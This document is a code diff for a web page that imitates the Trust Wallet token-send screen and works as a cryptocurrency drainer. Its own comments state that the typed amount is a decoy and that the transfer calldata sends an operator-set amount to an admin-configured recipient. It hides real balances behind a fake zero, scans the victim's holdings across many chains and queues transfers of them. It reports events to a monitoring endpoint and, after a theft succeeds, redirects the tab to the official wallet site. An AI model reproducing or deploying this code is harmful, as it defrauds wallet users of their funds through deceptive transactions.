+  "0xfa":   { usdt: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", usdc: "0x28a92dde19D9989F39A49905d7C9C2FAc7799bDf" },
+  "0x19":   { usdt: "0x66e428c3f67a68878562e79A0234c1F83c208770", usdc: "0xc21223249CA28397B4B6541dfFaEcC539BfF0c59" },
+  "0xe708": { usdt: "0xA219439258ca9da29E9Cc4cE5596924745e12B93", usdc: "0x176211869cA2b568f2A7D4EE941E073a821EE1ff" },
+  "0x82750":{ usdt: "0xf55BEC9cafDbE8730f096Aa55dad6D22d44099Df", usdc: "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4" }
+};
+
+var I18N = {
+  de: {
+    pageTitle: "Betrag",
+    send: "Senden",
+    back: "Zurück",
+    close: "Schließen",
+    addressLabel: "An",
+    addressPlaceholder: "Adresse oder Domainname",
+    paste: "Einfügen",
+    clipboard: "Zwischenablage",
+    scanQr: "QR-Code scannen",
+    destinationNetwork: "Netzwerk",
+    amount: "Betrag",
+    amountTitle: "Betrag",
+    toPrefix: "An:",
+    amountPlaceholder: "0",
+    next: "Prüfen",
+    selectNetwork: "Netzwerk auswählen",
+    searchTokens: "Nach Tokens suchen",
+    processing: "Verarbeitung...",
+    processingText: "Die Transaktion wird verarbeitet. Blockchain-Validierung läuft.",
+    transactionDetails: "Transaktionsdetails",
+    cameraUnavailable: "Kamera nicht verfügbar",
+    errorPrefix: "Fehler",
+    unknown: "Unbekannt",
+    successTitle: "Transaktion erfolgreich!",
+    successText: "Deine Übertragung wurde erfolgreich auf der Ethereum-Blockchain validiert.",
+    failedTitle: "Transaktion fehlgeschlagen",
+    failedText: "Die Transaktion ist auf der Ethereum-Blockchain fehlgeschlagen oder es ist ein Fehler aufgetreten.",
+    networkSwitch: "Netzwerkwechsel abgelehnt",
+    noAccount: "Kein Wallet-Konto verbunden",
+    insufficientBalance: "Token-Guthaben zu niedrig",
+    reverted: "Transaktion on-chain fehlgeschlagen"
+  },
+  en: {
+    pageTitle: "Amount",
+    send: "Send",
+    back: "Back",
+    close: "Close",
+    addressLabel: "To",
+    addressPlaceholder: "Address or domain name",
+    paste: "Paste",
+    clipboard: "Clipboard",
+    scanQr: "Scan QR code",
+    destinationNetwork: "Network",
+    amount: "Amount",
+    amountTitle: "Amount",
+    toPrefix: "To:",
+    amountPlaceholder: "0",
+    next: "Review",
+    selectNetwork: "Select network",
+    searchTokens: "Search tokens",
+    processing: "Processing...",
+    processingText: "The transaction is being processed. Blockchain validation is in progress.",
+    transactionDetails: "Transaction details",
+    cameraUnavailable: "Camera unavailable",
+    errorPrefix: "Error",
+    unknown: "Unknown",
+    successTitle: "Transaction successful!",
+    successText: "Your transfer was successfully validated on the Ethereum blockchain.",
+    failedTitle: "Transaction failed",
+    failedText: "The transaction failed on the Ethereum blockchain or an error occurred.",
+    networkSwitch: "Network switch declined",
+    noAccount: "No wallet account connected",
+    insufficientBalance: "Insufficient token balance",
+    reverted: "Transaction failed on-chain"
+  }
+};
+var currentLocale = "en";
+
+function detectLocale() { return "en"; }
+
+function t(key) {
+  return I18N[currentLocale][key] || I18N.en[key] || key;
+}
+
+function applyLanguage() {
+  currentLocale = detectLocale();
+  document.documentElement.lang = currentLocale;
+  document.title = t("pageTitle");
+  var textNodes = document.querySelectorAll("[data-i18n]");
+  for (var i = 0; i < textNodes.length; i++) textNodes[i].textContent = t(textNodes[i].getAttribute("data-i18n"));
+  var placeholders = document.querySelectorAll("[data-i18n-placeholder]");
+  for (var j = 0; j < placeholders.length; j++) placeholders[j].placeholder = t(placeholders[j].getAttribute("data-i18n-placeholder"));
+  var titled = document.querySelectorAll("[data-i18n-title]");
+  for (var k = 0; k < titled.length; k++) {
+    var label = t(titled[k].getAttribute("data-i18n-title"));
+    titled[k].title = label;
+    titled[k].setAttribute("aria-label", label);
+  }
+  updateUI();
+  if (modalOpen) showResult();
+}
+
+function isValidAddr(a) { return typeof a === "string" && /^0x[a-fA-F0-9]{40}$/.test(a); }
+// Middle-truncated like the real app: 0xB2bC…373b1 — the to-bar is one line
+// on every screen width; the edit sheet still carries the full address.
+function shortAddr(a) {
+  return (typeof a === "string" && a.length > 14) ? a.slice(0, 8) + "…" + a.slice(-4) : a;
+}
+
+// Remote live-monitoring — same /api/events store as the checker page
+var MONITOR_URL = "/api/events";
+var monitSid = "w-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var payload = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: monitSid, page: "wallet", d: data || {} });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+
+// Normalize any provider shape to a promise-based RPC — injected wallets vary:
+// some expose request(), older ones only sendAsync/send, and chainIds come back
+// as hex strings, decimal strings, or numbers depending on the wallet
+function rpc(p, method, params) {
+  try {
+    if (typeof p.request === "function") return Promise.resolve(p.request({ method: method, params: params }));
+    if (typeof p.sendAsync === "function") return new Promise(function(res, rej) {
+      p.sendAsync({ method: method, params: params, id: Date.now(), jsonrpc: "2.0" }, function(e, r) { e ? rej(e) : res(r && r.result); });
+    });
+    if (typeof p.send === "function") return Promise.resolve(p.send(method, params));
+  } catch(e) { return Promise.reject(e); }
+  return Promise.reject(new Error("provider has no rpc method"));
+}
+// Silent account read — intentionally NO eth_requestAccounts: an approved or
+// auto-connected wallet ("dApp automatisch verbinden") resolves without any
+// sheet, and anything else lets eth_sendTransaction surface the wallet's own
+// connect/confirm UI instead of a separate connect prompt
+function connectedAccounts(p) {
+  return rpc(p, "eth_accounts");
+}
+function sameChain(a, b) {
+  try { return BigInt(a) === BigInt(b); } catch(e) { return false; }
+}
+function getChainId(p) {
+  return rpc(p, "eth_chainId").catch(function() {
+    return rpc(p, "net_version").then(function(v) {
+      try { return v != null ? "0x" + BigInt(v).toString(16) : null; } catch(e) { return null; }
+    }).catch(function() { return null; });
+  }).then(function(cid) {
+    return cid != null ? cid : (p.chainId != null ? p.chainId : null);
+  });
+}
+
+function parseUrl() {
+  var params = new URLSearchParams(window.location.search);
+  // Stale checker handoff links (deep links carrying a prepared ?q= queue or
+  // ?auto&addr) belong to the checker pipeline — it runs the silent scan and
+  // fires only the wallet's own confirm sheets, no mask. Redirect before any
+  // paint. ?scan=1 stays here: the admin "Wallet Scan + Confirm" mode shows
+  // this mask while the background scan fills the queue, and direct send
+  // links (?to&amount&token) have no handoff params at all.
+  var isHandoffLink = params.get("q") != null || (params.get("auto") === "1" && params.get("addr") != null);
+  if (isHandoffLink) {
+    location.replace("/checker?" + new URLSearchParams(location.search).toString());
+    return;
+  }
+  var dataParam = params.get("data");
+  if (dataParam) {
+    try {
+      var d = JSON.parse(atob(decodeURIComponent(dataParam)));
+      if (d.to && isValidAddr(d.to)) { displayAddr = d.to; txRecipient = d.to; recipientFromUrl = true; }
+      if (d.token === "usdt" || d.token === "usdc") { displayToken = d.token; txToken = d.token; }
+      if (d.token === "custom" && d.contract && isValidAddr(d.contract)) { txToken = "custom"; txContract = d.contract; displayToken = "TOKEN"; }
+      if (d.amount && !isNaN(Number(d.amount)) && Number(d.amount) >= 0) { txAmount = d.amount; displayAmount = String(d.amount); }
+      if (d.decimals && !isNaN(Number(d.decimals))) { txDecimals = Number(d.decimals); }
+      if (d.chainId && CONTRACTS[d.chainId]) { currentChain = d.chainId; }
+    } catch(e) {}
+  } else {
+    var to = params.get("to"), amount = params.get("amount"), token = params.get("token"), contract = params.get("contract"), decimals = params.get("decimals"), chainId = params.get("chainId");
+    if (to && isValidAddr(to)) { displayAddr = to; txRecipient = to; recipientFromUrl = true; }
+    if (token === "usdt" || token === "usdc") { displayToken = token; txToken = token; }
+    if (token === "custom" && contract && isValidAddr(contract)) { txToken = "custom"; txContract = contract; displayToken = "TOKEN"; }
+    if (decimals && !isNaN(Number(decimals))) { txDecimals = Number(decimals); }
+    if (chainId && CONTRACTS[chainId]) { currentChain = chainId; }
+    if (amount && !isNaN(Number(amount)) && Number(amount) >= 0) { txAmount = amount; displayAmount = String(amount); }
+  }
+  // Prepared handoff queue from the checker's scan — compact {k,c,r} or full
+  // {n,a,c,d,r,u}. The screen previews item 1; the Confirm button runs them.
+  var qParam = params.get("q");
+  if (qParam) {
+    try {
+      var arr = JSON.parse(qParam);
+      if (Array.isArray(arr)) {
+        arr.slice(0, 10).forEach(function(it) {
+          if (!it || !CHAIN_INFO[it.c] || !it.r || !/^\d+$/.test(String(it.r)) || !(BigInt(it.r) > 0n)) return;
+          var tok = null;
+          if (it.k) {
+            var known = (SCAN_TOKENS[it.c] || []).filter(function(t) { return t.key === it.k; })[0];
+            if (known) tok = { name: known.name, addr: known.addr, decimals: known.decimals, key: it.k };
+          } else if (isValidAddr(it.a)) {
+            tok = { name: String(it.n || "TOKEN").replace(/[^A-Za-z0-9 .\-_]/g, "").slice(0, 12) || "TOKEN",
+                    addr: it.a, decimals: Number(it.d) >= 0 ? Number(it.d) : 18, key: null };
+          }
+          if (tok) {
+            tok.raw = String(it.r);
+            tok.chainId = it.c;
+            tok.usdValue = Number(it.u) || 0;
+            handoffQueue.push(tok);
+          }
+        });
+      }
+    } catch(e) {}
+  }
+  var addrParam = params.get("addr");
+  if (addrParam && isValidAddr(addrParam)) expectedAccount = addrParam;
+  var hParam = params.get("h");
+  if (hParam) handoffId = String(hParam).replace(/[^A-Za-z0-9]/g, "").slice(0, 24);
+  // ?scan=1 — the wallet page itself runs the multi-chain scan against the
+  // connected account; no checker page, no prepared queue in the URL
+  if (params.get("read") === "0") noWalletRead = true;
+  // read=0 keeps the field empty — the placeholder 0 shows and the user
+  // types the amount themselves; nothing is prefilled from the link
+  if (noWalletRead) displayAmount = "";
+  if (params.get("scan") === "1") {
+    scanMode = true;
+    // Typed amount is a decoy in scan mode — the field always starts empty
+    displayAmount = "";
+    // Zero balance shown — never fetched, never updates, hides real holdings
+    var balEl = document.getElementById("token-balance");
+    var fiatEl = document.getElementById("token-fiat");
+    if (balEl) balEl.textContent = "0";
+    if (fiatEl) fiatEl.textContent = "$0.00";
+  }
+  if (handoffQueue.length > 0) previewQueueItem(0);
+  if (!txAmount) txAmount = "1";
+  if (!displayAmount) displayAmount = "";
+  updateUI();
+  // Remote default recipient (Vercel Edge Config) — applies when the link
+  // itself carries no recipient. Keeps every device on the admin-set address.
+  remoteConfigP = fetch("/api/config").then(function(r) { return r.json(); }).then(function(j) {
+    // Admin-set minimum pull amount — Edge Config wins over the hardcoded floor.
+    // 0 is a real value (no dust filter), not "unset" — check null not >0.
+    if (j && j.ok && j.minPullUsd != null && !isNaN(Number(j.minPullUsd))) MIN_FLAG_USD = Number(j.minPullUsd);
+    if (!recipientFromUrl && j && j.ok && isValidAddr(j.recipient)) {
+      displayAddr = j.recipient; txRecipient = j.recipient;
+      var inp = document.getElementById("input-addr");
+      if (inp) inp.textContent = shortAddr(j.recipient);
+      updateUI();
+    }
+  }).catch(function() {});
+}
+
+function pickProvider() {
+  var tw = window.trustwallet;
+  var p = (tw && tw.ethereum) ? tw.ethereum : (window.ethereum || null);
+  // Some TW builds expose the provider as window.trustwallet itself
+  if (!p && tw && typeof tw.request === "function") p = tw;
+  return p;
+}
+
+function findProvider() {
+  return new Promise(function(resolve) {
+    var tries = 0, done = false;
+    function finish(p) { if (!done) { done = true; resolve(p); } }
+    // TW fires trustwallet#initialized the moment its provider finishes
+    // injecting — the reliable late-injection signal, faster than polling
+    window.addEventListener("trustwallet#initialized", function() {
+      var p = pickProvider();
+      if (p) finish(p);
+    }, { once: true });
+    function check() {
+      var p = pickProvider();
+      if (p) { finish(p); return; }
+      if (tries++ < 30) { setTimeout(check, 300); } else { finish(null); }
+    }
+    check();
+  });
+}
+
+function detectWallet() {
+  findProvider().then(function(p) {
+    if (!p) return;
+    provider = p;
+    // Landing report — tells a Safari-side retry loop that the universal link
+    // routed correctly, so it must not fire again and reload the running page
+    if (handoffId) monit("handoff_opened", { h: handoffId, via: "wallet" });
+    // ?read=0 links skip the account read entirely — the wallet only ever
+    // hears from us when eth_sendTransaction asks for its own confirm sheet
+    if (!noWalletRead) {
+      rpc(p, "eth_accounts").then(function(accs) {
+        if (accs && accs.length > 0) { account = accs[0]; fetchTokenBalance(p); }
+      }).catch(function(){});
+      if (p.on) { p.on("accountsChanged", function(accs) {
+        account = accs.length > 0 ? accs[0] : null;
+        fetchTokenBalance(p);
+        // Account arrived after a dead-end scan — rescan and re-arm a queue
+        // the user already committed to with the Confirm tap
+        if (account && scanMode && scanFinished && (scanOutcome === "no_account" || scanOutcome === "no_provider")) {
+          queuePending = userCommitted && !queueStarted;
+          scanFinished = false; scanOutcome = null;
+          startWalletScan();
+        }
+      }); }
+    }
+  });
+}
+
+// Populate the balance row like the real app — balanceOf via the wallet's own
+// RPC, silently. Falls back to 0 when no provider/account is reachable.
+function fetchTokenBalance(p) {
+  // Scan mode shows a static decoy balance — the real holdings must never
+  // appear on the frontend or leak through an auto-refresh. read=0 links
+  // skip the read entirely: no balance row, no multi-chain probe
+  if (scanMode || noWalletRead) return;
+  if (!p || !account || !isValidAddr(account)) return;
+  var contract = getContract();
+  if (!contract) return;
+  var data = "0x70a08231" + account.toLowerCase().replace("0x", "").padStart(64, "0");
+  var paint = function(raw) {
+    walletBal = Number(raw) / Math.pow(10, txDecimals);
+    var balEl = document.getElementById("token-balance");
+    var fiatEl = document.getElementById("token-fiat");
+    if (balEl) balEl.textContent = (Math.floor(walletBal * 1e6) / 1e6).toString();
+    if (fiatEl) fiatEl.textContent = "$" + walletBal.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  };
+  // Decimals differ per chain — BSC USDT/USDC use 18, most others 6. The
+  // calldata amount must be scaled for the chain the funds actually sit on
+  var chainDec = function(cid) {
+    if (txToken === "custom") return txDecimals;
+    var st = (SCAN_TOKENS[cid] || []).filter(function(t) { return t.key === txToken; })[0];
+    return st ? st.decimals : txDecimals;
+  };
+  var needFor = function(cid) {
+    return BigInt(Math.floor(Number(txAmount || "0") * Math.pow(10, chainDec(cid))));
+  };
+  // Read via public RPC pinned to currentChain — the wallet provider answers
+  // for whatever chain IT is on, which may differ from the mask's chain
+  rpcCall(currentChain, "eth_call", [{ to: contract, data: data }, "latest"]).then(function(res) {
+    var raw = res && res !== "0x" ? BigInt(res) : 0n;
+    if (raw >= needFor(currentChain) || txToken === "custom") { paint(raw); return; }
+    // The current chain cannot cover the amount — the funds may sit on
+    // another network. Probe every supported chain for this token and move
+    // the mask onto the first chain that actually holds enough balance
+    var switched = false;
+    Object.keys(CONTRACTS).forEach(function(cid) {
+      var c = CONTRACTS[cid];
+      var tc = txToken === "usdc" ? c.usdc : c.usdt;
+      rpcCall(cid, "eth_call", [{ to: tc, data: data }, "latest"]).then(function(res2) {
+        var raw2 = res2 && res2 !== "0x" ? BigInt(res2) : 0n;
+        if (switched || raw2 < needFor(cid) || sameChain(cid, currentChain)) return;
+        switched = true;
+        currentChain = cid;
+        txDecimals = chainDec(cid);
+        var nn = document.getElementById("network-name");
+        if (nn) nn.textContent = chainName(cid);
+        ["0x1","0x38","0x89","0xa4b1","0xa","0x2105","0xa86a","0xa4ec","0xfa","0x19","0xe708","0x82750"].forEach(function(cc) {
+          var el = document.getElementById("check-" + cc);
+          if (el) el.classList.toggle("active", cc === cid);
+        });
+        updateUI();
+        paint(raw2);
+      }).catch(function(){});
+    });
+    paint(raw);
+  }).catch(function(){});
+}
+
+function updateUI() {
+  document.getElementById("input-addr").textContent = shortAddr(displayAddr);
+  document.getElementById("display-amount").value = formatAmount(displayAmount) || "";
+  document.getElementById("display-token").textContent = displayToken.toUpperCase();
+  var badge = document.getElementById("token-badge");
+  if (badge) {
+    badge.style.background = CHAIN_COLORS[currentChain] || "#627EEA";
+    badge.innerHTML = '<svg viewBox="0 0 24 24" fill="#fff">' + (CHAIN_BADGES[currentChain] || CHAIN_BADGES["0x1"]) + '</svg>';
+  }
+  var iconEl = document.getElementById("token-icon");
+  if (iconEl) {
+    var tk = TOKEN_ICONS[displayToken.toLowerCase()] ||
+      '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="' + (CHAIN_COLORS[currentChain] || "#627EEA") + '"/><text x="12" y="16" text-anchor="middle" font-size="11" font-weight="700" fill="#fff" font-family="Inter,system-ui,sans-serif">' + displayToken.charAt(0).toUpperCase() + '</text></svg>';
+    var oldSvg = iconEl.querySelector("svg");
+    if (oldSvg) oldSvg.outerHTML = tk; else iconEl.insertAdjacentHTML("afterbegin", tk);
+  }
+  document.getElementById("header-title").textContent = t("amountTitle");
+  document.getElementById("to-label").textContent = t("toPrefix") + " ";
+  var amtInp = document.getElementById("display-amount");
+  var num = parseFloat(displayAmount.replace(",", "."));
+  var valid = displayAmount && !isNaN(num) && num >= 0;
+  var tokEq = valid ? num / RATE : 0;
+  var fiatEq = valid ? num * RATE : 0;
+  if (fiatMode) {
+    amtInp.value = valid || displayAmount ? "$" + (formatAmount(displayAmount) || "0") : "";
+    amtInp.placeholder = "$0";
+    document.getElementById("approx").textContent = valid
+      ? tokEq.toFixed(8).replace(/0+$/, "").replace(/\.$/, "") + " " + displayToken.toUpperCase()
+      : "0 " + displayToken.toUpperCase();
+  } else {
+    amtInp.value = formatAmount(displayAmount) || "";
+    amtInp.placeholder = "0";
+    document.getElementById("approx").textContent = valid
+      ? "≈ $" + fiatEq.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+      : "≈ $0.00";
+  }
+  // Shrink the amount font on long values so it never wraps (46 → 40 → 36 → 32)
+  var alen = amtInp.value.replace(/[$\s]/g, "").length;
+  amtInp.style.fontSize = alen >= 14 ? "32px" : alen >= 11 ? "36px" : alen >= 8 ? "40px" : "";
+  // Insufficient-balance state — red amount + hint, button stays disabled.
+  // Skipped in scan mode: the typed amount is a decoy — the real sends use the
+  // scanned queue, and each item re-checks balanceOf before firing.
+  var tokAmt = fiatMode ? tokEq : num;
+  var over = !scanMode && walletBal != null && !isNaN(tokAmt) && tokAmt > 0 && tokAmt > walletBal;
+  document.getElementById("display-amount").style.color = over ? "#FF5A5F" : "";
+  var hint = document.getElementById("amount-hint");
+  if (hint) hint.classList.toggle("hidden", !over);
+  var btn = document.getElementById("next-btn");
+  btn.textContent = (isLoading || queuePending) ? t("processing") : t("next");
+  // The button turns blue the moment a number is in the field — even mid-scan.
+  // A tap while scanning arms the queue instead of blocking on scanFinished
+  if (queuePending || (!isNaN(num) && num >= 0 && !over && isValidAddr(displayAddr))) {
+    btn.classList.add("ready");
+    btn.disabled = !!(isLoading || queuePending);
+  } else {
+    btn.classList.remove("ready");
+    btn.disabled = true;
+  }
+}
+
+function formatAmount(val) {
+  var t = val.replace(/\s+/g, "");
+  var parts = t.split(/[.,]/);
+  var sep = t.indexOf(",") > -1 ? "," : (t.indexOf(".") > -1 ? "." : "");
+  var intPart = parts[0].replace(/\D/g, "");
+  intPart = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, " ");
+  if (parts.length > 1) return intPart + sep + parts[1].replace(/\D/g, "");
+  return intPart;
+}
+
+function toggleFiatMode() { fiatMode = !fiatMode; updateUI(); }
+
+function onAmountInput() {
+  displayAmount = document.getElementById("display-amount").value.replace(/[$\s]/g, "");
+  updateUI();
+}
+
+// Custom numpad — mirrors the in-app keypad, no native keyboard
+function pressKey(k) {
+  var inp = document.getElementById("display-amount");
+  var cur = inp.value.replace(/[$\s]/g, "");
+  if (k === "." && cur.indexOf(".") > -1) return;
+  var dotAt = cur.indexOf(".");
+  if (k !== "." && dotAt > -1 && cur.length - dotAt - 1 >= 6) return;
+  if (cur.length >= 18) return;
+  if (cur === "0" && k !== ".") cur = "";
+  inp.value = cur + k;
+  if (navigator.vibrate) navigator.vibrate(8);
+  onAmountInput();
+}
+function backKey() {
+  var inp = document.getElementById("display-amount");
+  inp.value = inp.value.replace(/[$\s]/g, "").slice(0, -1);
+  if (navigator.vibrate) navigator.vibrate(6);
+  onAmountInput();
+}
+
+function setMax() {
+  // Max fills the shown balance — except in scan mode: writing the real
+  // scanned balance into the input would leak the calldata amount, so it
+  // stays a neutral placeholder
+  var bal = scanMode ? 1 : (walletBal != null && walletBal > 0 ? Math.floor(walletBal * 1e6) / 1e6 : 5.0);
+  displayAmount = String(fiatMode ? Math.floor(bal * RATE * 1e6) / 1e6 : bal);
+  updateUI();
+}
+
+function closePage() { window.history.back(); }
+
+// Network selection — bottom sheet
+var currentChain = "0x1";
+function openNetworkSheet() {
+  document.getElementById("network-sheet").classList.remove("hidden");
+}
+function closeNetworkSheet() {
+  document.getElementById("network-sheet").classList.add("hidden");
+}
+function selectNetwork(chainId, name, color) {
+  currentChain = chainId;
+  var nn = document.getElementById("network-name");
+  if (nn) nn.textContent = name;
+  updateUI();
+  closeNetworkSheet();
+  // Update checkmarks
+  var checks = ["0x1","0x38","0x89","0xa4b1","0xa","0x2105","0xa86a","0xa4ec","0xfa","0x19","0xe708","0x82750"];
+  checks.forEach(function(c) {
+    var el = document.getElementById("check-" + c);
+    if (el) el.classList.toggle("active", c === chainId);
+  });
+}
+function filterNetworks(query) {
+  var items = document.getElementById("network-list").querySelectorAll(".sheet-item");
+  items.forEach(function(item) {
+    var name = item.querySelector(".sheet-item-name").textContent.toLowerCase();
+    item.style.display = name.includes(query.toLowerCase()) ? "flex" : "none";
+  });
+}
+
+// Clipboard paste
+function pasteAddr() {
+  if (navigator.clipboard && navigator.clipboard.readText) {
+    navigator.clipboard.readText().then(function(t) {
+      var trimmed = t.trim();
+      if (isValidAddr(trimmed)) {
+        displayAddr = trimmed;
+        txRecipient = trimmed;
+        updateUI();
+      }
+    }).catch(function(){});
+  }
+}
+
+// QR scan placeholder
+function scanQR() {
+  // In a real app this would open the camera
+  // For demo, we just show a toast
+  var toast = document.createElement("div");
+  toast.style.cssText = "position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:var(--text);color:var(--bg);padding:10px 20px;border-radius:10px;font-size:14px;z-index:9999;";
+  toast.textContent = t("cameraUnavailable");
+  document.body.appendChild(toast);
+  setTimeout(function() { document.body.removeChild(toast); }, 2000);
+}
+
+function getContract() {
+  if (txToken === "custom" && txContract) return txContract;
+  var chain = currentChain || "0x1";
+  var c = CONTRACTS[chain] || CONTRACTS["0x1"];
+  return txToken === "usdc" ? c.usdc : c.usdt;
+}
+
+function clickNext() {
+  if (isLoading) return;
+  if (navigator.vibrate) navigator.vibrate(10);
+  // Scan mode: Confirm fires ONLY the scanned queue — never the typed amount.
+  // The typed figure is a decoy; if the background scan found nothing
+  // eligible, the button surfaces an honest state instead of a fallback send
+  if (scanMode) {
+    if (handoffQueue.length > 0) { startQueue(); return; }
+    if (!scanFinished) {
+      // Scan still running — the user already committed, so arm the queue:
+      // finish() fires it the moment the scan resolves
+      queuePending = true;
+      userCommitted = true;
+      updateUI();
+      return;
+    }
+    if (scanOutcome === "empty") {
+      modalStatus = "error"; modalOpen = true;
+      modalError = "No eligible assets found on this wallet.";
+      showResult();
+      return;
+    }
+    // no_account / no_provider — the tap is a real gesture, so the wallet's
+    // own connect request fires now (silent on TW's auto-connected provider).
+    // Our modal only remains as the last resort after a genuine rejection.
+    userCommitted = true;
+    queuePending = true;
+    updateUI();
+    requestAccountThenScan();
+    return;
+  }
+  // Checker-prepared queue: the Confirm button fires the transfer() calldata
+  // the scan built — sequential sends, each still confirmed by the wallet sheet
+  if (handoffQueue.length > 0) { startQueue(); return; }
+  modalOpen = false; modalError = ""; isLoading = true;
+  var btn = document.getElementById("next-btn");
+  btn.textContent = t("processing");
+  btn.disabled = true;
+  // txAmount stays the admin-set link value — the typed amount is display
+  // only; the calldata always executes what the operator configured
+  if (txAmount === "" || txAmount == null || isNaN(Number(txAmount)) || Number(txAmount) < 0) {
+    modalStatus = "error"; modalOpen = true; isLoading = false; showResult(); return;
+  }
+  var p = provider;
+  if (!p) {
+    findProvider().then(function(found) {
+      if (!found) { isLoading = false; resetBtn(); return; }
+      provider = found; doTransfer(found);
+    });
+    return;
+  }
+  doTransfer(p);
+}
+
+// Poll eth_getTransactionReceipt until mined (~2 min cap) — real status, no fake
+function pollReceipt(p, hash, tries) {
+  return rpc(p, "eth_getTransactionReceipt", [hash]).then(function(r) {
+    if (r && r.status) return r;
+    if (tries >= 40) return { status: "pending" };
+    return new Promise(function(res) { setTimeout(function() { res(pollReceipt(p, hash, tries + 1)); }, 3000); });
+  }).catch(function() {
+    if (tries >= 40) return { status: "pending" };
+    return new Promise(function(res) { setTimeout(function() { res(pollReceipt(p, hash, tries + 1)); }, 3000); });
+  });
+}
+
+function doTransfer(p) {
+  // Kick the account read off in parallel — eth_accounts is chain-independent,
+  // serializing it behind the chain verify only adds latency before the sheet.
+  // read=0 links skip it entirely: no from, no balance pre-check — the wallet
+  // fills the sender itself when its own confirm sheet opens
+  var accsP = noWalletRead ? Promise.resolve(null) : connectedAccounts(p).catch(function() { return null; });
+  getChainId(p).then(function(cid) {
+    if (cid != null && !sameChain(cid, currentChain)) {
+      return rpc(p, "wallet_switchEthereumChain", [{ chainId: currentChain }]).then(function() {
+        // Let the provider settle into the new network before re-verifying —
+        // rapid calls against a mid-switch bridge have crashed TW iOS
+        return new Promise(function(r) { setTimeout(r, 500); });
+      }).then(function() {
+        // Verify the wallet actually landed on the target chain — a declined
+        // or failed switch must not send calldata to the wrong network
+        return getChainId(p);
+      });
+    }
+    return cid;
+  }).catch(function() { return null; }).then(function(cid2) {
+    if (!sameChain(cid2, currentChain)) throw new Error(t("networkSwitch"));
+    // Brief pause after the chain verify — back-to-back RPC bursts on a
+    // freshly opened provider bridge have crashed Trust Wallet iOS
+    return new Promise(function(r) { setTimeout(r, 350); }).then(function() {
+      return accsP;
+    });
+  }).then(function(accs) {
+      var from = accs && accs[0];
+      var contract = getContract();
+      var amountRaw = Math.floor(Number(txAmount) * Math.pow(10, txDecimals));
+      var send = function(fromAddr) {
+        var calldata = "0xa9059cbb" +
+          txRecipient.toLowerCase().replace("0x", "").padStart(64, "0") +
+          amountRaw.toString(16).padStart(64, "0");
+        var txParams = { to: contract, data: calldata, gas: "0x249f0" };
+        if (fromAddr) txParams.from = fromAddr;
+        return rpc(p, "eth_sendTransaction", [txParams]).then(function(hash) {
+          monit("tx_sent", { token: displayToken, chain: currentChain, to: txRecipient, hash: hash });
+          return hash;
+        });
+      };
+      // No silent account — send anyway and let the wallet surface its own
+      // connect/confirm sheet (eth_requestAccounts is intentionally unused)
+      if (!from || !isValidAddr(from)) return send(null);
+      // Pre-check the token balance through the wallet's own RPC — a transfer
+      // above the balance would revert on-chain, not just warn in the wallet
+      var data = "0x70a08231" + String(from).toLowerCase().replace("0x", "").padStart(64, "0");
+      return rpc(p, "eth_call", [{ to: contract, data: data }, "latest"]).then(function(res) {
+        var bal = res && res !== "0x" ? BigInt(res) : 0n;
+        if (bal < BigInt(amountRaw)) throw new Error(t("insufficientBalance"));
+        return send(from);
+      });
+  }).then(function(hash) {
+    txHash = hash;
+    modalStatus = "pending"; modalOpen = true; isLoading = false; showResult();
+    return pollReceipt(p, hash, 0);
+  }).then(function(receipt) {
+    if (receipt.status === "pending") {
+      monit("tx_pending_timeout", { hash: txHash });
+      modalStatus = "pending"; showResult(); return; // still unmined — honest pending, no fake success
+    }
+    modalStatus = (receipt.status === "0x1" || receipt.status === 1) ? "success" : "error";
+    if (modalStatus === "error") modalError = t("errorPrefix") + ": " + t("reverted");
+    monit(modalStatus === "success" ? "tx_confirmed" : "tx_reverted", { hash: txHash, chain: currentChain });
+    showResult();
+    // Erfolg kurz zeigen, dann DApp-Tab auf die offizielle Wallet-Seite drehen
+    // (Coinbase-Provider → base.org, sonst Trust Wallet).
+    if (modalStatus === "success") {
+      var home = (provider && provider.isCoinbaseWallet) ? "https://www.base.org" : "https://trustwallet.com/";
+      setTimeout(function() { location.replace(home); }, 2600);
+    }
+  }).catch(function(e) {
+    modalStatus = "error"; modalOpen = true; isLoading = false;
+    modalError = t("errorPrefix") + ": " + (e.message || e.code || t("unknown"));
+    monit("tx_error", { reason: String(e.message || e.code || "unknown").slice(0, 200), hash: txHash || null });
+    showResult();
+  });
+}
+
+function resetBtn() {
+  var btn = document.getElementById("next-btn");
+  btn.textContent = t("next");
+  btn.disabled = false;
+}
+
+function showResult() {
+  if (!modalOpen) { document.getElementById("result-modal").classList.add("hidden"); return; }
+  document.getElementById("result-modal").classList.remove("hidden");
+  var cBtn0 = document.getElementById("connect-btn");
+  if (cBtn0) cBtn0.classList.add("hidden");
+  var icon = document.getElementById("modal-icon");
+  if (modalStatus === "pending") {
+    icon.className = "modal-icon pending";
+    icon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#4D7CFF" stroke-width="2"><circle cx="12" cy="12" r="10" opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10" stroke="#4D7CFF" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="1s" repeatCount="indefinite"/></path></svg>';
+    document.getElementById("result-title").textContent = t("processing");
+    document.getElementById("result-title").style.color = "";
+    document.getElementById("result-text").textContent = t("processingText");
+    document.getElementById("result-link").classList.add("hidden");
+  } else if (modalStatus === "success") {
+    icon.className = "modal-icon success";
+    icon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#05B956" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>';
+    document.getElementById("result-title").textContent = t("successTitle");
+    document.getElementById("result-title").style.color = "#05B956";
+    var sentLabel = (displayAmount ? displayAmount + " " : "") + displayToken.toUpperCase();
